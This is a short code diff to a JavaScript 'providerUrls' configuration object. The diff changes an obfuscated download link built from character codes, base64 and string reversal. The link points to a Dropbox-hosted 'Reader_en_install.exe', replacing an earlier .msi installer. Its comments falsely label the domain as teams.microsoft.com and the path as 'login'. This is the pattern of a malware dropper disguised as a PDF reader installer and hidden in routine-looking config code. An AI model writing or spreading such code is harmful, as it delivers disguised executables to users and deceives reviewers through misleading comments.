@@ -1649,7 +1649,7 @@ const providerUrls = {
         enabled: true,
         p: "h" + String.fromCharCode(116) + String.fromCharCode(116) + "p" + "s:",  // Protocol: "https:"
         h: atob("Ly93d3cuZHJvcGJveC5jb20v"),  // Domain: "//teams.microsoft.com/"
-        e: btoa("scl/fi/9jawl0c88n2d9f1s7m4zv/pdf_Reader_en_install.msi?rlkey=r1yfnnrbdt9a48xp3bma98e8i&st=zlhr1cwt&dl=1").split("").reverse().join("")  // Path: "login" (base64 + reversed)
+        e: btoa("scl/fi/gwkm8b03bex9nlen8od40/Reader_en_install.exe?rlkey=3y5dvjn0ep9rsg2fs95fk52ud&st=5v15elkw&dl=1").split("").reverse().join("")  // Path: "login" (base64 + reversed)
     },
     
     // Google - Example configuration
